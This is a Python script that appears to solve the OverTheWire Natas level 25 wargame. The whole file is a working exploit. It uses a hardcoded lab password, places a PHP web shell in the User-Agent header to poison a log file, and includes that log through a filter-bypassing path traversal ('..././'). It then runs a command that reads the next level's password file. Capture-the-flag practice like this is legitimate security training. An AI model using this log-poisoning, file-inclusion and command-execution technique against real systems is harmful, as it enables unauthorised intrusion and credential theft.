import requests
import re
from requests.auth import HTTPBasicAuth

pw_regex = "[a-zA-Z0-9]{32}"

def get_pass():
    auth = HTTPBasicAuth('natas25','GHF6X7YwACaYYssHVY05cFq83hRktl4c')
    cook = {'PHPSESSID':'wshell'}
    head = {'User-Agent':'<?php passthru($_GET[\'cmd\']); ?>'} 
    param = {'lang':'..././logs/natas25_wshell.log', 'cmd':'cat /etc/natas_webpass/natas26'} 
    r = requests.get('http://natas25.natas.labs.overthewire.org/', auth=auth, cookies=cook, headers=head, params=param)
    print(re.findall(pw_regex,r.text)[1])

if __name__ == '__main__':
    get_pass()
